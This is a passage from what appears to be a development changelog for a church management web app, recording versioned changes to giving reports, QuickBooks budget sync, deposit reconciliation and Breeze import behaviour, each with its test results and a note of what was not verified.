informational only — nobody on it needs to change anything.
- `computeGivingPlateaus()` gains `low_frequency_givers_list` — every low-frequency giver (still also
  present in the normal tiers, not excluded), **sorted by total given descending** so a one-time major
  gift sorts to the top, not buried under small occasional gifts. Each entry carries a new
  `all_manual_methods` flag (true only if every one of their gifts this year used a non-automatic
  method — check/cash/other) so someone already on ACH/card/auto-draft isn't wrongly flagged as a
  recurring-giving candidate.
- Endpoint: new `SUM(CASE WHEN <automatic-method-list> THEN 1 ELSE 0 END) AS auto_gifts` in both the
  household and person SQL branches (mirrors `bucketGivingMethod()`'s existing 'ach' bucket exactly,
  so this doesn't invent a second classification), plus a new `low_frequency_max` query param
  (default 3, admin-configurable, replaces the hardcoded threshold).
- UI: new "Occasional = ≤ X gifts/yr" input on the Plateaus card; a new "Occasional Givers" card
  (Name/Total/Gifts/Avg/Method) rendered right after the summary stat cards — copy is explicitly
  framed as staff reference ("not a suggestion anything needs to change"), with a "check/cash only"
  vs. "already has automatic gifts" badge per row, and — when the church's Online Giving URL is
  configured (Giving → Settings) — a direct link shown as the natural next step for that
  conversation. **Fixed a pre-existing, unrelated latent bug found while wiring this up**: a
  different giving-statement function already read `_churchConfig.giving_url`, but the real config
  key returned by `config/church` is `online_giving_url` — that existing code path's link has
  silently always been blank; not touched here (out of scope, flagging for a follow-up), but this
  new code correctly reads `online_giving_url`.
- `npm test` (371/371, 4 new tests: sort-by-total-with-major-gift-first, informational-not-
  exclusionary, manual-vs-automatic-method flag, custom threshold). `node --check` on both built
  bundles + backend; verified the `auto_gifts` SQL against a real in-memory SQLite database. Not
  verified in a live browser. (`src/api-utils.js`, `src/api-reports.js`, `src/frontend/js-reports.js`,
  `src/frontend/html-tabs.js`, `test/giving-plateaus.test.js`)

### v1.104.0 — Fixed why the reconstructed Budget vs Actual always showed $0 budget (2026-07-28)
Reported live: the app's own reconstruction (Budget entity + ProfitAndLoss, now the only thing
ever displayed per v1.103.0) showed Actual correctly but Budget as $0 on every single line. Traced
to `mergeLeafCells()` (`src/api-finance.js`) matching a P&L report account to its Budget line by
**exact string name** — `ctx.budgetByName.get(cells[0].value)` — with no fallback. QuickBooks can
display the same account with a slightly different label in the P&L report than in the Budget
entity (a real, known quirk), which silently fails every match with no error, exactly matching
"budget always 0, actual always populates" (Actual comes straight from the P&L tree and never goes
through this lookup at all). Confirmed the reconstruction only ever reads the *one* selected Budget
object (`budget.BudgetDetail`, picked via the new Budget picker or year-match) — ruling out the
user's "every budget ever" hypothesis; the double-counting risk isn't in this code path.

Fixed by adding a **new primary match key: QuickBooks' own account id** (present as `.id` on a
report ColData cell — standard Reports API behavior for an account-labeled column), which is
exact and can't drift the way a display label can. Falls back to the existing name-based matching
(unchanged) when a cell carries no `.id`, so nothing regresses for any shape that lacks it. New
`budgetByAccountId` map built alongside the existing `budgetByName`/`budgetIdsByName`.

`npm test` (351/351, 2 new regression tests: id-match succeeds where name-match would find
nothing; name-fallback still works when no id is present), `node --check` on `api-finance.js` and
both built app-JS bundles. Not verified against a live sync. (`src/api-finance.js`,
`test/finance-church.test.js`)

### v1.103.0 — Stop trusting the native Budget vs Actual report; Multi-Year year-range picker; comma formatting (2026-07-28)
Live testing right after v1.102.0's endpoint-name fix: the native `BudgetVsActuals` report finally
responded for the first time (previously always 5020'd), but its numbers didn't hold up — e.g. an
"Actual" many times larger than its own "Budget" for the same account. Consistent with everything
found this session (Intuit's own developer-community forum confirms this report is undocumented and
unsupported), the most likely explanation is the report isn't honoring `start_date`/`end_date` and is
summing since the QuickBooks company's inception rather than the requested fiscal year. Given the
app's own reconstruction (`mergeCurrentYearBudgetAndActual` — Budget entity + a date-scoped
`ProfitAndLoss` report, both confirmed to respect date filtering correctly) has been reliable this
whole time, **the sync now always uses the reconstruction for display, never the native report's
numbers** — the native call still runs (so a real failure surfaces as a warning) but its Rows are
never rendered. This also incidentally fixes the missing-column-header symptom reported (the native
report's real column shape wasn't something the generic renderer handled).

Two more items from the same live-testing round:
- **Multi-Year view year-range picker.** `finance/church/multi-year` has always defaulted to a
  rolling 5-year window (currentYear-4..currentYear) with no way to request anything older — so an
  older import (e.g. 2018) saved correctly but was invisible on every screen, which read as "the
  import isn't saving." New From/To year inputs + "Load Range" button on the Multi-Year view request
  an explicit `years=` range (capped at 20 years per request).
- **Comma formatting** on the Budget vs Actual table's dollar cells (new `finFmtReportCellValue()`,
  skips percent-suffixed values and non-numeric text).

`npm test` (340/340), `node --check` on `api-finance.js` and both built app-JS bundles. A stray
backtick in a comment briefly broke the build (the recurring `String.raw`-escaping bug class
documented elsewhere in this file) — caught by `npm test` itself before shipping, not a live report.
Not verified against a live sync. (`src/api-finance.js`, `src/frontend/js-finance.js`)

### v1.102.0 — Two real QuickBooks bugs found + Budget picker (2026-07-28)
Live sync testing (immediately after the CHURCH_SOURCE_PRIORITY flip above made qbo_sync-sourced
data visible for the first time) surfaced two genuine, previously-hidden bugs, plus a real feature
request. Full detail logged in `CLAUDE.md` under FIN2 for reference in later sessions.

1. **Wrong report endpoint name.** `client.budgetVsActual()` (`src/quickbooks.js`) called
   `/reports/BudgetVsActual` (singular) the entire time this was blocked by a "5020 Permission
   Denied" error — QuickBooks' real (undocumented, per Intuit's own developer community) report
   name is `BudgetVsActuals` (plural). A misnamed report is a very plausible explanation for a
   misleading permission error instead of a clean 404. Fixed to the plural name. Confirmed via a
   user-supplied community reference that this endpoint is genuinely undocumented/unsupported by
   Intuit regardless — the entity-query + ProfitAndLoss reconstruction this app already builds
   (`mergeCurrentYearBudgetAndActual`) is the actual sanctioned approach, not a fallback.
2. **Classification normalization gap, live-sync-only.** `flattenReportTree()` used a QuickBooks
   report Section's raw label as `classification` with no normalization — but this church's live
   QuickBooks report labels top-level sections "Revenue"/"Expenditures", not "Income"/"Expenses"
   (the exact synonym set `normalizeChurchClassification()` already handles for the Excel-import
   path). Unnormalized, live-synced rows' classification never matched `FIN_CHURCH_CLASS_ORDER`'s
   keys, so `finReorganizeChurchTree()` silently sorted Income to the bottom and skipped the
   Revenue/Earned-Income/Restricted-Income regrouping for synced data — invisible until sync
   started winning over import. Fixed by routing the Section label through
   `normalizeChurchClassification()`. New regression test in `test/finance-church.test.js`.
3. **Budget picker.** A company can have more than one `Budget` object in QuickBooks (e.g. a
   leftover test budget); the merge previously guessed (best year-match, else the first found)
   with no way to override. New `GET`/`PATCH /admin/api/finance/qb/budgets` (admin-gated write)
   lists every Budget object and lets an admin pin one explicitly (`chms_config` key
   `finance_qb_selected_budget_id`), threaded through `mergeCurrentYearBudgetAndActual()`. New
   "Choose Budget…" control on the Finance Overview QuickBooks Connection card.

`npm test` (340/340), `node --check` on `api-finance.js`, `quickbooks.js`, and both built app-JS
bundles. Not verified against a live sync — this session's Production connection work is ongoing.
(`src/quickbooks.js`, `src/api-finance.js`, `src/frontend/js-finance.js`,
`test/finance-church.test.js`)

### Doc update — FIN2 confirmed reproducing in Production, not just sandbox (2026-07-28)
No code change. Live Production OAuth connection completed (real QB keys, `QB_ENVIRONMENT=production`,
redirect URI registered under both Intuit app tabs), and a real sync against the real church
QuickBooks company hit the identical `5020 Permission Denied` error on Budget vs Actual — ruling out
"sandbox-only artifact." Intuit will not open a support ticket for this app/tier, so the earlier
"ticket filed, no ETA" status is closed off with no resolution. The existing reconstruction fallback
(raw `Budget` entity query + `ProfitAndLoss` merge) fired correctly and the sync completed. See FIN2
in `CLAUDE.md` for full detail — treating the direct report endpoint as permanently unavailable for
this app; next real step is verifying the reconstructed numbers against this company's actual live
data, not chasing the report endpoint further.

### v1.103.0 — Giving Plateaus: fixed-ladder nudges, always-on impact, total÷52 for everyone (2026-07-27)
Four corrections to G27 (the graduated-percentage redesign), requested right after seeing it.

1. **Back to fixed round numbers, not percentages.** `computeNudgeOptions()` no longer scales a
   percentage by giving level — `NUDGE_PCT_TIERS`/floating-point-prone percentage math is gone
   entirely. Instead, a single curated `GIVING_NUDGE_LADDER`: the original hand-picked low/mid
   numbers (10, 15, 20 … 1000 — the exact values behind the well-liked 43→50 and 83→100 examples),
   densified from $1,000 up ($100 steps to $5,000, $250 to $10,000, $500 to $25,000, $1,000 above) so
   the *next 3 rungs* stay a modest, still-round ask even at high levels — $2,500/wk now offers
   $2,600/$2,700/$2,800, not a jump straight to $3,000. `computeNudgeOptions(base)` is just "the next
   3 ladder rungs above base," extending in flat $1,000 steps past the ladder's top for the rare
   giver beyond it. Zero floating-point risk (no more `100 * 1.10 !== 110`) since it's pure integer
   comparison against a precomputed array.
2. **Every increase option always shows a concrete dollar impact**, even the Modest one. Each option
   now carries `annual_delta_cents` (the plain "+$X/year" figure, always present) alongside the
   optional `impact_text` (only shown when a configured statement's threshold is actually cleared) —
   previously a Modest option with a small delta could show a bare dollar figure with nothing tying
   it to a reason; now the annualized total is unconditional, per the explicit ask that "$5 more a
   week gets to $250 a year" should always be stated.
3. **Retirement/IRA (QCD)/stock/occasional givers get the exact same treatment as everyone else** —
   the separate "Large & Occasional Gifts" exclusion list from G27 is gone. A giver who wrote one
   $2,600 December check now reads identically to a giver who gave $50 every Sunday: both show as
   "$50/wk," both get the same 3 nudge options. A `low_frequency` flag (gifts ≤ 3/year, configurable)
   is still carried per giver so the UI can show the explicit narrative framing requested — "gave $X
   in N gifts last year — about $Y/wk spread over the year" — right under a low-frequency giver's name
   in the per-tier breakdown, rather than hiding them in a separate table with no suggested action.
4. **Every giver's weekly figure = their whole year's giving (every fund) ÷ 52.** Replaces the old
   "find the modal repeated per-gift amount" plateau-finding entirely — that model structurally
   couldn't handle a giver who doesn't repeat an identical amount (which is most occasional/major
   givers, item 3 above). The endpoint's SQL simplified to match `reports/giving-bands`'s existing
   shape (one row per giver: `SUM(amount)`, `COUNT(*)` — no more per-day grouping), reusing the same
   `periodsElapsed` convention (52 for a complete past year; weeks-so-far for the current
   in-progress year, so pace isn't understated). `min_repeat` — the whole concept — is gone from the
   API and the UI (the "Min. repeats" field was removed from the Plateaus card).

`npm test` (348/348, `test/giving-plateaus.test.js` rewritten — 21 cases including a same-treatment
regression test proving a weekly $50/wk giver and a one-time $2,600 giver produce byte-identical
nudge options). `node --check` on both built app-JS bundles and touched backend files; scanned the
served bundle for the double-backslash escaping bug class (VUXBUG2/SC3-BUG1) — 3 hits, all
pre-existing and unrelated to this change, none in the touched code. Not verified in a live browser.
(`src/api-utils.js`, `src/api-reports.js`, `src/frontend/js-reports.js`, `src/frontend/html-tabs.js`,
`test/giving-plateaus.test.js`)

### v1.102.0 — Giving Plateaus: graduated nudge options, impact framing, occasional givers, fund scope (2026-07-27)
Four follow-ups on the Giving Plateaus report, all requested together after first review.

1. **Less aggressive nudges at the top, via 3 graduated options instead of 1 fixed target.**
   `givingNudgeTarget()`/`GIVING_NUDGE_LADDER` (a fixed round-number ladder — always jump to the
   next rung, e.g. 2500→3000, a 20%/$500-a-week ask) replaced with `computeNudgeOptions(baseDollars)`
   in `api-utils.js`: returns 3 options (**Modest/Standard/Generous**), each a "nice" round number,
   where the **percentage step shrinks as the base amount grows** (`NUDGE_PCT_TIERS`: 30–100% under
   $15/wk down to 3–10% above $1,500/wk) — the same relative ask reads very differently in absolute
   dollars at different giving levels. $43/wk → $50/$56/$66 (was a flat $50); $2,500/wk → $2,600/
   $2,700/$2,800 (was $3,000). **Real bug caught before shipping**: `base * (1 + pct)` hits IEEE 754
   floating-point noise (`100 * 1.10 === 110.00000000000001`), which `Math.ceil`-to-increment was
   amplifying into overshooting to the NEXT increment entirely (110→120 instead of landing on 110) —
   fixed by rounding to the nearest cent before the ceil step; caught by hand-verifying computed
   values against a Node harness, not by the unit tests alone (they'd have locked in the wrong
   numbers). Nudge Targets table now groups by the Standard option (unchanged shape) with a Modest–
   Generous upside range; the per-tier people drill-down shows all 3 options per row.
2. **Impact framing** ("if you gave $18 more a month, that could provide X") — new admin-editable
   "Giving Impact Statements" list (`config/giving-impact` GET/PUT in `api-import.js`, one JSON array
   in `chms_config`; "Impact statements…" button + modal on the Plateaus card). Deliberately **never
   pre-filled or fabricated** — real ministry costs are church-specific and this app doesn't invent
   them; empty by default, admin types their own `$X/month → label` rows. New pure
   `pickImpactPhrase(monthlyDeltaCents, statements)` picks the richest statement a given option's
   monthly-equivalent increase actually clears; each nudge option carries its own `impact_text`
   (null if nothing configured or nothing qualifies). Impact-editor input rows use the `data-*` +
   delegated-handler pattern (`platImpactRowInput`), not inline `onclick` with string args — the
   exact quote-escaping bug class documented elsewhere in this file (VUXBUG2/SC3-BUG1); also caught
   and fixed a literal double-backslash (`\\'`) that had crept into two OTHER lines in this same edit
   (the impact-editor markup and the exclusion-note copy) via the standard extract-and-`node --check`
   verification step, before it could reintroduce that exact bug class into the served bundle.
3. **Retirement/IRA (QCD)/stock givers weren't visible.** These rarely repeat the same dollar amount
   3+ times (by nature, a QCD or stock gift is usually once or a few times a year), so they were
   silently folded into "variable" with no visibility. New **"Large & Occasional Gifts"** section
   (`occasional_givers` in `computeGivingPlateaus`'s return, sorted by total given, capped and
   flagged with a truncation count) — no automatic dollar nudge (an occasional gift style doesn't
   fit a "+$X/week" ask), just visibility for a personal follow-up. Also added an
   **excluded-organizations diagnostic**: gifts recorded under an organization-type person record
   (e.g. a brokerage/custodian entered as its own record) are still excluded from every giver query
   by design — a business shouldn't count as a pledging household — but the endpoint now returns a
   count + total for what was excluded, shown as a callout, so a QCD accidentally filed under a
   custodian's name doesn't just vanish with zero trace.
4. **Multi-fund handling clarified + a Fund filter added (solves the Concordia Children's Fund ask
   too).** Confirmed via a real-SQLite harness: the report already sums **every fund** a giver gives
   to on the same day into one combined amount — a Tuition Aid or Food Pantry gift was never
   discounted, already included in the day total. New `&fund_id=` param (both
   `reports/giving-plateaus` and `reports/giving-bands`) plus a Fund `<select>` on both Board Report
   cards (populated from the existing `allFunds`/`GET /admin/api/funds`) lets the same analysis run
   scoped to just one fund — including a designated pass-through fund like Concordia Children's Fund,
   which functions as a separate organization the church only handles US-side fundraising for. No
   fund-specific code — any fund in the dropdown works the same way.

`npm test` (347/347, 20 in the rewritten `test/giving-plateaus.test.js` — including a regression
guard locking in the exact floating-point-fix values). `node --check` on both built app-JS bundles
and all touched backend files. A real in-memory-SQLite harness confirms the fund filter correctly
isolates one fund's giving while leaving "All Funds" mode summing everything (nothing discounted).
Not verified in a live browser.
(`src/api-utils.js`, `src/api-reports.js`, `src/api-import.js`, `src/frontend/js-reports.js`,
`src/frontend/js-giving.js`, `src/frontend/html-tabs.js`, `test/giving-plateaus.test.js`)

### v1.101.0 — Church Report: QuickBooks sync now outranks a file import (2026-07-28)
Per user decision 2026-07-28 (Finance/FIN2 QuickBooks Production rollout in progress): a mid-year
file import was originally meant as a stopgap while the live QuickBooks connection wasn't working
yet — it shouldn't permanently shadow sync once the connection is confirmed. `CHURCH_SOURCE_PRIORITY`
(`resolveChurchYearPrecedence()`, `src/api-finance.js`) flipped from `['import', 'qbo_sync',
'plan_committed']` to `['qbo_sync', 'import', 'plan_committed']` — a year with any `qbo_sync` row now
uses ONLY those rows; `import` is the fallback for a year QuickBooks was never connected for (or
predates this app's live sync), not an override once sync exists. No data is deleted — an existing
import stays in the database untouched and reappears automatically the moment a year's `qbo_sync`
rows are removed (there's no removal path today, so this is a pure read-order flip, not yet paired
with a UI to un-sync a year — flag if that's wanted later). Applies everywhere
`resolveChurchYearPrecedence()` is used: Church Report (This Year/Multi-Year), Board Report,
Budget Planning's base-year figures, and the giving/attendance reference lines. `CHURCH_MONTHLY_SOURCE_PRIORITY`
(`['qbo_sync', 'monthly_import']`) already had sync-wins-over-import for the monthly-granularity
path — this brings the annual path in line with it, so the two no longer disagree. Updated 2
`test/finance-church.test.js` cases that asserted the old (now-reversed) precedence, added a new
case for the import-only-fallback path. `npm test` (339/339), `node --check` on both built app-JS
bundles. Not verified against a live QuickBooks sync (still in progress per FIN2/this session).
(`src/api-finance.js`, `test/finance-church.test.js`)

### v1.100.0 — Deposit reconciliation UI (GIV-DEP frontend) (2026-07-28)
The deposit-reconciliation **backend** (GIV-DEP, migration `0031`) was already committed on this
branch by a prior run — `giving_deposits` table, per-gift `fee_cents`/`source`/`processor`/
`external_txn_id`/`reconcile_status`, and the full finance-gated endpoint set (list / create /
detail / patch / delete / assign / reconcile / reopen), with `computeDepositTotals()` unit-tested.
This slice adds the **frontend workflow** that was missing (nothing in `js-giving.js` referenced it):
a new **Deposits** sub-nav view in the Giving tab (finance-gated), master-detail like Batches —
list of deposits (Open/Reconciled filter) on the left, detail on the right. Detail shows the
two-number model the church actually wants: **Given** (gross, from synced gifts) vs. **Bank deposit**
(entered by the bookkeeper) vs. **Fees = Given − Deposited**, computed live as the bank amount is
typed. Workflow: **+ New** deposit (date / source check|cash|online|mixed / optional payout ref) →
**+ Add gifts** pulls the pool of unassigned gifts (new `GET giving/unassigned-gifts`, `deposit_id
IS NULL`) with select-all → enter the bank amount → **Reconcile to Bank** stamps the gifts complete;
**Reopen**/**Delete** available; Delete releases gifts back to unassigned (never deletes a gift).
This is the "some cover the fee, some don't" self-correcting design — donor-covered gifts add equally
to Given and Deposited so they cancel, leaving exactly the church-absorbed fee in the gap. The
per-gift `fee_cents` (processor-reported, e.g. Tithe.ly) is surfaced as a cross-check line when
present but is 0 until a processor adapter feeds it. **Not verified in a live browser.** Verified:
`npm test` (338/338), `node --check` on `api-giving.js` + both served app-JS bundles (SC3-BUG1
extract-and-check technique), and a `node:sqlite` harness confirming the unassigned-gifts filter
excludes already-assigned gifts. (`src/api-giving.js`, `src/frontend/js-giving.js`,
`src/frontend/html-tabs.js`, `src/frontend/js-core.js`)

### v1.93.0 — Giving by Weekly/Monthly Band report (2026-07-27)
New "Giving by Weekly / Monthly Band" card in the Board Report tab (below the Plateaus card),
answering "how do households spread across per-week giving levels, and what would a small
across-the-board step up add." Distinct from the Plateaus report (which finds each giver's modal
repeated gift and nudges to the next clean rung): this one is a **distribution across granular
dollar bands** with a flat, configurable uplift — the "$50/wk now, $60/wk = +$520/yr" framing.
- Endpoint `GET /admin/api/reports/giving-bands?year=&scope=household|person&freq=weekly|monthly&uplift_cents=`
  (gated `giving`). SUMs each giver's whole-year giving (household = spouses combined, same key-expr
  pattern as the plateaus household mode), then bands them.
- Pure `computeGivingBands()` in `api-utils.js` (7 unit tests): a giver's per-period figure =
  their giving ÷ periods elapsed (frequency-agnostic — monthly/lump-sum givers land in the right
  weekly band). Two floor sets (`GIVING_BAND_FLOORS_WEEKLY_CENTS` $0/25/50/75/100/150/200/300/500,
  monthly ≈×4). The uplift's annual impact uses a FULL year (52/12), while the pace uses periods
  *elapsed* — so a partial current year isn't understated but the uplift isn't overstated.
- UI (`js-reports.js` `runGivingBands`/`renderGivingBands`): summary cards (givers / +$ per year if
  all step up / current annualized), a band table (band · bar · count · avg · given · +$X→+$/yr),
  Week/Month + Household/Person + uplift-$ controls; renders into its own `#giv-bands-output`.
- `npm test` (297/297), `node --check` on both built bundles + backend, plus an in-memory-SQLite
  harness confirming the household SUM/band bucketing ($50/wk household, $100/wk person). Not
  verified in a live browser. (`src/api-utils.js`, `src/api-reports.js`, `src/frontend/js-reports.js`,
  `src/frontend/js-giving.js`, `src/frontend/html-tabs.js`, `test/giving-bands.test.js`)

### v1.92.0 — Giving Plateaus: moved to the Board Report tab (2026-07-27)
Per user request, relocated the Giving Plateaus & Nudges report from the Giving → Reports tile grid
into the **Board Report** sub-view (Finance → Giving → Board Report), where the strategic/leadership
giving analysis belongs. It's now a card below the council report body with its own controls
(Year / Group by / Min. repeats) and its own dedicated output element `#giv-plat-output` — not routed
through the shared `showRptOutput` (which broadcasts to the Reports-view targets and would leak other
reports into this tab). `runGivingPlateaus()` renders straight into that element with a loading/error
state; the year prefills to the current year when the Board view opens (`givSetView('board')`) and
also defaults defensively if left blank. No backend change. `npm test` (290/290), `node --check` on
both built bundles. Not verified in a live browser. (`src/frontend/html-tabs.js`,
`src/frontend/js-reports.js`, `src/frontend/js-giving.js`)

### v1.90.0 — Giving Plateaus: per-household mode (2026-07-27)
Added a **Group by: Household / Person** selector to the Giving Plateaus report (household is the
new default). In household scope a household is one "giver" — spouses who give separately on the
same day are summed into one contribution, so a couple that together drops $43/wk shows a $43
plateau, not two smaller ones. Givers with no household stand alone (link back to the person).
- Endpoint gained `&scope=household|person`. Household query keys/GROUP BYs on a
  `CASE … 'h:'||household_id … 'p:'||id` expression joined to `households` for the display name
  (falls back to `<lastname> Household`, then `Household #<id>` when the household name is blank).
- **Real bug caught by an in-memory-SQLite harness before shipping**: the group key was first
  aliased `person_id`, which collides with the `ge.person_id` column — SQLite grouped by the
  person, not the household, so spouses' same-day gifts never merged (Smith household read $25
  instead of $43). Fixed by grouping on the key *expression*, not the ambiguous alias; harness now
  confirms $43→$50.
- `computeGivingPlateaus()` carries `link_id`/`link_kind` through per row so the UI opens the
  household view (or person) on click; person scope defaults them to the person (unchanged
  behavior). Labels ("givers"/"households", "People"/"Households") switch with scope.
- `npm test` (290/290, 2 new pure-function tests for the link passthrough), `node --check` on both
  built bundles + backend, plus the SQLite harness above. Not verified in a live browser.
### v1.90.0 — Church Budget Planning: "FY{base} Projected" column (2026-07-27)
Added an auto-computed year-end projection column to the Church Budget Planning table
(`finRenderPlanning` in `js-finance.js`), inserted between `FY{base} Actual` and the untouched
`FY{target} Plan` column: `Category · FY2026 Bud · FY2026 Actual · FY2026 Projected · FY2027 Plan
· Δ%`. The new column projects where the in-progress base year will land at year-end by annualizing
each leaf account's actual-to-date by `12/throughMonth` — the exact same proration `generate-all`
uses server-side (`api-finance.js`), so the Projected column literally shows the base amount the
Plan column was grown from. `throughMonth` = current month when the base year is the current year,
else 12 (a complete past year projects to its own actual). Group rows roll up as the sum of their
leaves (uniform factor, so subtotals reconcile); base-year projected net inserted into the Net row.
Display-only — nothing is stored, no data moved (per the user's "auto-compute" choice over
re-keying existing Plan data). Verified: `npm test` (288/288), `node --check` on both built app-JS
bundles, and a vm harness rendering the actual served `finRenderPlanning` (confirms 6 columns, the
new `FY2026 Projected` header, and 6-cell data/net rows). Not verified in a live browser.
(`src/frontend/js-finance.js`)
### v1.91.0 — Giving Plateaus: per-household mode (2026-07-27)
Added a **Group by: Household / Person** selector to the Giving Plateaus report (household is the
new default). In household scope a household is one "giver" — spouses who give separately on the
same day are summed into one contribution, so a couple that together drops $43/wk shows a $43
plateau, not two smaller ones. Givers with no household stand alone (link back to the person).
- Endpoint gained `&scope=household|person`. Household query keys/GROUP BYs on a
  `CASE … 'h:'||household_id … 'p:'||id` expression joined to `households` for the display name
  (falls back to `<lastname> Household`, then `Household #<id>` when the household name is blank).
- **Real bug caught by an in-memory-SQLite harness before shipping**: the group key was first
  aliased `person_id`, which collides with the `ge.person_id` column — SQLite grouped by the
  person, not the household, so spouses' same-day gifts never merged (Smith household read $25
  instead of $43). Fixed by grouping on the key *expression*, not the ambiguous alias; harness now
  confirms $43→$50.
- `computeGivingPlateaus()` carries `link_id`/`link_kind` through per row so the UI opens the
  household view (or person) on click; person scope defaults them to the person (unchanged
  behavior). Labels ("givers"/"households", "People"/"Households") switch with scope.
- `npm test` (290/290, 2 new pure-function tests for the link passthrough), `node --check` on both
  built bundles + backend, plus the SQLite harness above. Not verified in a live browser.

### v1.89.0 — Giving Plateaus & Nudges report (2026-07-27)
New "Giving Plateaus & Nudges" tile in the Finance tab's Giving Reports section (finance/admin,
`require-finance`). Answers "where do givers settle, and what should I nudge them to." The church's
actual giving page is external (Tithe.ly at give.timothystl.org — confirmed not in this repo), so
this is the in-app analysis half: it hands the pastor the tier→target table to then set as suggested
amounts in Tithe.ly.
- **Endpoint** `GET /admin/api/reports/giving-plateaus?year=YYYY&min_repeat=N` (`src/api-reports.js`).
  Pulls one row per (person, giving-day) with that day's SUMmed contribution (so a fund-split gift
  counts as the single amount the giver actually gave), excludes organizations. Gated as `giving`
  via the central `ACCESS_GATE` (seg starts with `reports/giving`) — same path as giving-insights,
  no per-handler check needed.
- **Pure math** in `src/api-utils.js`, unit-tested (`test/giving-plateaus.test.js`, 10 cases):
  - `givingNudgeTarget(dollars)` — next rung up a fixed "attractive amounts" ladder. Reproduces the
    user's own examples exactly: 43→50, 83→100; 50→60, 100→125; above the top rung rounds up to the
    next $1,000.
  - `computeGivingPlateaus(rows, {minRepeat})` — each giver's plateau = the whole-dollar per-gift
    amount they repeat most (modal; tie-break to the HIGHER amount so upside is never overstated).
    A giver only counts as "plateaued" if that amount recurs ≥ `minRepeat` times (default 3) —
    screens out one-off/variable givers (counted separately). Per-person upside = (target−plateau)
    × number of gifts they already make; grouped into tiers by nudge target, plus a fine per-dollar
    histogram.
- **UI** (`src/frontend/js-reports.js` `runGivingPlateaus`/`renderGivingPlateaus`, tile in
  `html-tabs.js`): summary stat cards (plateaued givers / est. added giving per year / variable
  givers), a Nudge Targets table (target · #people · plateau range · avg increase · est. +$/yr),
  a collapsible per-tier people list (click a name → profile), and a plateau-distribution histogram.
  Year defaults to current; a "Min. repeats" input is exposed on the tile.
- **Upside is an estimate**, stated in the UI: assumes each plateaued giver keeps their current
  giving frequency but at the nudged amount — it does not predict who will actually say yes.
- `npm test` (288/288), `node --check` on both built app-JS bundles + `api-utils.js`/`api-reports.js`.
  **Not verified**: a live browser or against live giving data (no D1 access in-session).

### v1.86.0 — Giving redesign Phase 1: sub-nav restructure + Board Report (2026-07-27)
First phase of the Giving tab redesign (design handoff: board reports, donor letters, receipts).
Delivered as phased PRs, foundation first (user decision); this PR is the sub-nav restructure and
the Board Report (options 1A dashboard + 1B narrative). Later phases: Letters & Statements (1C/1D),
Analysis (2A), Trends (3A/3B), and receipts (both A+B scaffolding, per user decision).
- **Sub-nav restructure.** The four-button `.view-toggle` in `#tab-giving` is now a `.fin-subnav`
  bar matching the Finance tab: **Batches · Transactions · Board Report · Reports · Settings**.
  `givSetView()` is now data-driven (loops over `_GIV_VIEWS`) instead of per-id toggles. This is a
  *transitional* nav — the target design retires "Reports" once Letters (1C) and Analysis (2A)
  land in later phases; kept for now so nothing existing breaks mid-redesign.
- **Board Report (1A/1B).** New `#giv-view-board` panel, finance-gated, aggregate-only (no
  individual donors named). A **Dashboard / Narrative** toggle renders the same data two ways:
  - *Dashboard*: 4 KPI cards (Given YTD, Vs. budget YTD, Year-end projection, Giving households),
    a month-by-month grouped bar chart (prior year / current-through-last-closed-month / budget),
    a navy "Where the money comes from" method-mix + concentration panel, and a By-fund table
    (YTD actual / YTD budget / variance / prior year).
  - *Narrative*: a US-Letter prose page for the packet (lede + "Are we on pace / Who is giving /
    How gifts arrive" + compact fund table + footnote), print-to-PDF ready.
  - **Print board page** sets `body.printing-board` so only the board panel prints (the shared
    subnav + toolbar hide, grids stay full width) — the in-place `@media print` approach the
    handoff asked for, not a popup. **Email packet** is a stubbed alert (pointed at a later phase).
- **Backend.** New `GET /admin/api/reports/giving-board?period=YYYY-MM|YYYY-Qn|YYYY` (`api-reports.js`)
  computes everything from real `giving_entries`/`funds`/`people` data so the figures reconcile
  (YTD total = fund table = method mix; households from real household grouping; loose-plate cash
  with no person is excluded from household/concentration but counted in the fund total, matching
  the design). Pure math extracted to `api-utils.js` and unit-tested (`test/giving-board.test.js`,
  14 cases): `bucketGivingMethod`, `projectYearEnd` (seasonal vs. straight-line, method named for
  the UI), `spreadBudgetYtd` (annual budget spread by prior-year monthly shape — December carries
  it), `computeConcentration` (top-10 share, half-households, 4-segment bar).
- **Fund budgets.** New `budget_annual_cents` column on `funds` (migration `0028` + `db.js` safety
  net); `PUT /admin/api/funds/:id` accepts it (only when sent, so a plain edit never clobbers it);
  the Settings → Import/Export **Manage Funds** card gained an "Annual budget" input. With no
  budgets set, the board gracefully shows "—" for budget/variance and hides the budget bars.
- **Verification.** `npm test` (268/268, +14), `node --check` on both built app-JS bundles, an
  end-to-end render harness against the served EXT bundle (dashboard + narrative + no-budget empty
  state), and a real-SQLite integration test of all five board queries (totals reconcile, loose
  plate correctly excluded from households). **Not verified**: an actual browser.
  (`src/api-reports.js`, `src/api-utils.js`, `src/api-households.js`, `src/db.js`,
  `migrations/0028_fund_budget.sql`, `src/frontend/html-tabs.js`, `src/frontend/html-head.js`,
  `src/frontend/js-giving.js`, `src/frontend/js-export-import.js`, `test/giving-board.test.js`)

### v1.85.1 — Redundant preferred name (== first name) is suppressed (2026-07-27)
A preferred name that just repeats the first name is no longer treated as a real preferred name. (`src/frontend/js-people.js`, `src/api-import.js`)
- Profile header display name no longer renders `John "John" Smith` — the quoted preferred is shown only when it differs from the first name (case-insensitive).
- The Name card hides the "Preferred name" row entirely when it equals the first name (an empty preferred still shows an editable "Not set" row so one can be added).
- The person-edit modal save normalizes a preferred name equal to the first name to `''`, so redundant values clear on next save.
- The Breeze middle/nickname sync (`breeze-sync-names`) skips writing a nickname that equals the Breeze first name — stops redundant preferred names from being created in the first place (the likely original source).

### v1.85.0 — Breeze people sync is now add-only; newsletter moved to Tags & Groups (2026-07-27)
**Policy change (user):** Connect is the source of truth for **all people data**; only giving syncs from Breeze.
- **Bulk `import/breeze` is now add-only** (`src/api-import.js`): existing linked people are skipped at the top of the per-person loop — no field (name, contact, member type, household, photo, dates) is ever overwritten. Only brand-new Breeze people are inserted. The dead `locally_edited`-aware UPDATE branch was removed. The **deactivation pass** (which set `active=0` on Connect people missing from Breeze) and the **household anniversary-propagation pass** are both disabled — both modified existing people. Response still returns `deactivated`/`anniversaryPropagated` (now always 0) plus the existing `skipped` count. The `breeze_sync_seen_ids` accumulator is no longer written (was only for deactivation).
